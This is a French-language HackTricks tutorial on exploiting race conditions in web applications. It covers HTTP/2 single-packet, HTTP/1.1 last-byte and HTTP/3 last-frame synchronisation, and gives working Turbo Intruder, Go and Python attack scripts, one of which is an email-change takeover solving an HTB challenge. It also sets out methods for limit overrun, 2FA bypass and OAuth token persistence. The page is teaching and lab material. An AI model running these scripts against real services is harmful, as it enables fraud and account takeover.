# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Pour obtenir une compréhension approfondie de cette technique, consultez le rapport original sur [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Améliorer les attaques Race Condition

L'obstacle principal pour tirer parti des race conditions est de s'assurer que plusieurs requêtes sont traitées en même temps, avec une différence de temps de traitement très faible — idéalement, moins de 1ms.

Vous trouverez ici quelques techniques pour synchroniser les requêtes :

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2** : Permet d'envoyer deux requêtes sur une seule connexion TCP, réduisant l'impact du jitter réseau. Cependant, en raison des variations côté serveur, deux requêtes peuvent ne pas suffire pour un exploit de race condition fiable.
- **HTTP/1.1 'Last-Byte Sync'** : Permet l'envoi préalable de la plupart des parties de 20-30 requêtes, en retenant un petit fragment qui est ensuite envoyé en même temps, obtenant une arrivée simultanée au serveur.

**Préparation pour Last-Byte Sync** implique :

1. Envoyer les en-têtes et les données du body moins le dernier octet sans fermer le stream.
2. Faire une pause de 100ms après l'envoi initial.
3. Désactiver TCP_NODELAY pour utiliser Nagle's algorithm afin de regrouper les frames finales.
4. Envoyer des pings pour échauffer la connexion.

L'envoi ultérieur des frames retenues devrait aboutir à leur arrivée dans un seul paquet, ce qui peut être vérifié avec Wireshark. Cette méthode ne s'applique pas aux fichiers statiques, qui ne sont généralement pas impliqués dans les attaques RC.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept** : HTTP/3 s'exécute sur QUIC (UDP). Il n'y a pas de coalescence TCP ni de Nagle sur lesquels s'appuyer, donc le classic last‑byte sync ne fonctionne pas avec des clients standard. À la place, il faut délibérément coalescer plusieurs frames DATA de fin de stream QUIC (FIN) dans le même datagramme UDP afin que le serveur traite toutes les requêtes cibles dans le même tick d'ordonnancement.
- **How to do it** : Utilisez une bibliothèque dédiée qui expose le contrôle des frames QUIC. Par exemple, H3SpaceX manipule quic-go pour implémenter HTTP/3 last‑frame synchronization pour les requêtes avec body ainsi que les requêtes de type GET sans body.
- Requests‑with‑body : envoyer HEADERS + DATA moins le dernier octet pour N streams, puis envoyer ensemble le dernier octet de chaque stream.
- GET‑style : fabriquer de faux frames DATA (ou un petit body avec Content‑Length) et terminer tous les streams dans un seul datagramme.
- **Practical limits** :
  - La concurrence est limitée par le paramètre de transport QUIC max_streams du pair (similaire à SETTINGS_MAX_CONCURRENT_STREAMS d'HTTP/2). S'il est faible, ouvrez plusieurs connexions H3 et répartissez la course entre elles.
  - La taille des datagrammes UDP et le path MTU limitent le nombre de frames de fin de stream que vous pouvez coalescer. La bibliothèque gère la séparation en plusieurs datagrammes si nécessaire, mais un flush en un seul datagramme est le plus fiable.
- **Practice** : Il existe des laboratoires de race H2/H3 publics et des exploits exemples accompagnant H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### S'adapter à l'architecture du serveur

Comprendre l'architecture de la cible est crucial. Les serveurs frontaux peuvent router les requêtes différemment, ce qui affecte les temps de réponse. Le préchauffage des connexions côté serveur, via des requêtes sans importance, peut normaliser ces temps de réponse.

#### Gestion du verrouillage basé sur la session

Des frameworks comme le gestionnaire de session de PHP sérialisent les requêtes par session, ce qui peut masquer des vulnérabilités. Utiliser des jetons de session différents pour chaque requête peut contourner ce problème.

#### Contournement des limites de débit ou de ressources

Si le préchauffage des connexions est inefficace, provoquer volontairement des délais liés aux limites de débit ou de ressources des serveurs web en envoyant un flot de requêtes factices peut faciliter la single-packet attack en induisant un délai côté serveur propice aux conditions de course.

## Exemples d'attaque

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Vous pouvez envoyer la requête à **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), vous pouvez modifier dans la requête la valeur que vous voulez brute-forcer pour **`%s`** comme dans `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` et ensuite sélectionner le **`examples/race-single-packer-attack.py`** dans le menu déroulant:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Si vous allez **envoyer des valeurs différentes**, vous pouvez modifier le code avec celui-ci qui utilise une wordlist depuis le presse-papiers:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Si le site web ne prend pas en charge HTTP2 (seulement HTTP/1.1), utilisez `Engine.THREADED` ou `Engine.BURP` au lieu de `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Dans le cas où vous devez envoyer une requête à 1 endpoint puis plusieurs à d'autres endpoints pour déclencher la RCE, vous pouvez modifier le script `race-single-packet-attack.py` avec quelque chose comme :
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- C'est également disponible dans **Repeater** via la nouvelle option '**Send group in parallel**' de Burp Suite.
- Pour **limit-overrun** vous pouvez simplement ajouter la **même requête 50 fois** dans le groupe.
- Pour **connection warming**, vous pouvez **ajouter** au **début** du **groupe** quelques **requêtes** vers une partie non statique du serveur web.
- Pour **delaying** le processus **entre** le traitement **d'une requête et d'une autre** en 2 étapes de sous-états, vous pouvez **ajouter des requêtes supplémentaires entre** les deux requêtes.
- Pour un **multi-endpoint** RC vous pouvez commencer par envoyer la **requête** qui **va vers l'état caché** puis **50 requêtes** juste après qui **exploitent l'état caché**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Script python automatisé**: L'objectif de ce script est de modifier l'email d'un utilisateur tout en le vérifiant continuellement jusqu'à ce que le jeton de vérification du nouvel email arrive dans l'ancien (cela vient du fait que dans le code on observait un RC où il était possible de modifier un email mais que la vérification était envoyée à l'ancien car la variable indiquant l'email était déjà remplie avec le premier).\
Quand le mot "objetivo" est trouvé dans les emails reçus, on sait que nous avons reçu le jeton de vérification de l'email modifié et nous mettons fin à l'attaque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Sélection du moteur : utilisez `Engine.BURP2` sur les cibles HTTP/2 pour déclencher le single‑packet attack ; revenez à `Engine.THREADED` ou `Engine.BURP` pour la synchronisation last‑byte sur HTTP/1.1.
- `gate`/`openGate` : mettez en file plusieurs exemplaires avec `gate='race1'` (ou des gates par tentative), ce qui retient la fin de chaque requête ; `openGate('race1')` vide toutes les fins en même temps pour qu'elles arrivent presque simultanément.
- Diagnostics : des timestamps négatifs dans Turbo Intruder indiquent que le serveur a répondu avant que la requête soit entièrement envoyée, prouvant le recouvrement. C'est attendu dans de vraies races.
- Warmup de la connexion : envoyez un ping ou quelques requêtes inoffensives d'abord pour stabiliser les timings ; désactivez éventuellement `TCP_NODELAY` pour favoriser le regroupement des frames finales.


### Improving Single Packet Attack

Dans la recherche originale il est expliqué que cette attaque a une limite de 1,500 bytes. Cependant, dans [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), il est expliqué comment il est possible d'étendre la limitation de 1,500 bytes du single packet attack jusqu'à la limitation de fenêtre TCP de **65,535 B** en utilisant la fragmentation au niveau IP (scinder un seul paquet en plusieurs paquets IP) et en les envoyant dans un ordre différent, ce qui empêche le réassemblage du paquet tant que tous les fragments n'ont pas atteint le serveur. Cette technique a permis au chercheur d'envoyer 10,000 requêtes en environ 166 ms.

Notez que bien que cette amélioration rende l'attaque plus fiable pour des RC nécessitant des centaines/milliers de paquets arrivant en même temps, elle peut aussi rencontrer des limitations logicielles. Certains serveurs HTTP populaires comme Apache, Nginx et Go ont un réglage strict `SETTINGS_MAX_CONCURRENT_STREAMS` à 100, 128 et 250. En revanche, d'autres comme NodeJS et nghttp2 l'ont illimité.\
Cela signifie essentiellement qu'Apache ne considérera que 100 connexions HTTP provenant d'une seule connexion TCP (limitant cette attaque RC). Pour HTTP/3, la limite analogue est le paramètre de transport max_streams de QUIC – s'il est petit, répartissez votre race sur plusieurs connexions QUIC.

Vous pouvez trouver quelques exemples utilisant cette technique dans le dépôt [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Avant la recherche précédente, voici quelques payloads utilisés qui essayaient simplement d'envoyer les paquets aussi vite que possible pour provoquer un RC.

- **Repeater:** Consultez les exemples de la section précédente.
- **Intruder** : Envoyez la **requête** à **Intruder**, réglez le **number of threads** sur **30** dans le **Options menu**, sélectionnez comme payload **Null payloads** et générez **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Méthodologie**

### Dépassement de limite / TOCTOU

Il s'agit du type le plus basique de race condition où des **vulnérabilités** apparaissent dans des endroits qui **limitent le nombre de fois où vous pouvez effectuer une action**. Par exemple, utiliser le même code de réduction plusieurs fois dans une boutique en ligne. Un exemple très simple se trouve dans [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou dans [**this bug**](https://hackerone.com/reports/759247)**.**

Il existe de nombreuses variantes de ce type d'attaque, notamment :

- Utiliser une carte cadeau plusieurs fois
- Noter un produit plusieurs fois
- Retirer ou transférer des fonds au-delà du solde de votre compte
- Réutiliser la même solution CAPTCHA
- Contourner une limitation de taux anti-brute-force

### **Sous-états cachés**

L'exploitation de race conditions complexes implique souvent de tirer parti de brèves opportunités pour interagir avec des sous-états cachés ou **non prévus de la machine**. Voici comment aborder cela :

1. **Identifier les sous-états cachés potentiels**
- Commencez par identifier les endpoints qui modifient ou interagissent avec des données critiques, comme les profils utilisateur ou les processus de réinitialisation de mot de passe. Concentrez-vous sur :
- **Storage** : Préférez les endpoints qui manipulent des données persistantes côté serveur plutôt que ceux qui gèrent des données côté client.
- **Action** : Recherchez les opérations qui modifient des données existantes, plus susceptibles de créer des conditions exploitables que celles qui ajoutent de nouvelles données.
- **Keying** : Les attaques réussies impliquent généralement des opérations basées sur le même identifiant, par ex. username ou reset token.
2. **Effectuer le probing initial**
- Testez les endpoints identifiés avec des attaques de type race condition, en observant tout écart par rapport aux résultats attendus. Des réponses inattendues ou des changements dans le comportement de l'application peuvent indiquer une vulnérabilité.
3. **Démontrer la vulnérabilité**
- Réduisez l'attaque au nombre minimal de requêtes nécessaires pour exploiter la vulnérabilité, souvent seulement deux. Cette étape peut nécessiter plusieurs tentatives ou de l'automatisation en raison du timing précis requis.

### Attaques sensibles au temps

La précision dans le timing des requêtes peut révéler des vulnérabilités, en particulier lorsque des méthodes prévisibles comme les timestamps sont utilisées pour les security tokens. Par exemple, générer des password reset tokens basés sur des timestamps peut permettre d'obtenir des tokens identiques pour des requêtes simultanées.

**Pour exploiter :**

- Utilisez un timing précis, comme une attaque par single packet, pour effectuer des demandes de password reset concurrentes. Des tokens identiques indiquent une vulnérabilité.

**Exemple :**

- Demandez deux password reset tokens en même temps et comparez-les. Des tokens identiques suggèrent un défaut dans la génération des tokens.

**Consultez ce** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **pour essayer cela.**

## Études de cas sur les sous-états cachés

### Payer et ajouter un article

Consultez ce [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) pour voir comment **payer** dans une boutique et **ajouter un article supplémentaire** que vous **n'aurez pas à payer**.

### Confirmer d'autres adresses email

L'idée est de **vérifier une adresse email et de la changer simultanément** pour déterminer si la plateforme vérifie la nouvelle adresse.

### Changer l'email vers 2 adresses email (basé sur les cookies)

Selon [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab était vulnérable à une prise de contrôle de cette manière car il pouvait **envoyer** le **email verification token d'une adresse email vers l'autre**.

**Consultez ce** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **pour essayer cela.**

### États cachés de la database / Contournement de confirmation

Si **2 different writes** sont utilisés pour **ajouter** **des informations** dans une **database**, il existe une courte période où **seules les premières données ont été écrites** dans la database. Par exemple, lors de la création d'un utilisateur, le **username** et le **password** peuvent être **écrits**, puis **le token** pour confirmer le compte nouvellement créé est écrit. Cela signifie que pendant un court instant le **token to confirm an account is null**.

Par conséquent, **enregistrer un compte et envoyer plusieurs requêtes avec un token vide** (`token=` or `token[]=` ou toute autre variation) pour confirmer le compte immédiatement pourrait permettre de c**onfirmer un compte** dont vous ne contrôlez pas l'email.

**Consultez ce** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **pour essayer cela.**

### Contournement du 2FA

Le pseudo-code suivant est vulnérable à une race condition car, pendant une très courte durée, la **2FA n'est pas appliquée** alors que la session est créée:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistance éternelle

Il existe plusieurs [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ces services vous permettent de créer une application et d'authentifier les utilisateurs que le fournisseur a enregistrés. Pour ce faire, le **client** devra **autoriser votre application** à accéder à certaines de leurs données au sein du **OAUth provider**.\
Donc, jusqu'ici juste un login classique avec google/linkedin/github... où on vous affiche une page disant : "_L'application <InsertCoolName> veut accéder à vos informations, voulez-vous l'autoriser ?_"

#### Race Condition dans `authorization_code`

Le **problème** apparaît lorsque vous **l'acceptez** et qu'un **`authorization_code`** est automatiquement envoyé à l'application malveillante. Ensuite, cette **application abuse d'une Race Condition dans le fournisseur OAUth pour générer plus d'un AT/RT** (_Authentication Token/Refresh Token_) à partir du **`authorization_code`** pour votre compte. Fondamentalement, elle profitera du fait que vous avez accepté que l'application accède à vos données pour **créer plusieurs comptes**. Ensuite, si vous **cesser d'autoriser l'application à accéder à vos données**, une paire de AT/RT sera supprimée, mais les autres resteront valides.

#### Race Condition dans `Refresh Token`

Une fois que vous avez **obtenu un RT valide**, vous pouvez essayer de **l'abuser pour générer plusieurs AT/RT** et **même si l'utilisateur révoque les permissions** de l'application malveillante pour accéder à ses données, **plusieurs RT resteront valides.**

## **RC dans WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Références

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
